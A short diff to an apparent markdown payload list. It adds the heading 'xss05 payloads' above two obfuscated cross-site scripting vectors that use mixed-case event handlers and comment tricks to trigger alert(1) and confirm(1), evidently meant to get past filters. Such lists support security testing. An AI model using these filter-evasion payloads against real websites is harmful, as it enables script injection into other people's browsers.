@@ -1,4 +1,6 @@
-```javascript
+### xss05 payloads:
+
+```js
 <AuDiO/**/oNLoaDStaRt='(_=/**/confirm/**/(1))'/src><!--x
 
 <mArquee onStart=[~[onmouseleave(([[(alert(1))]]))]] ]
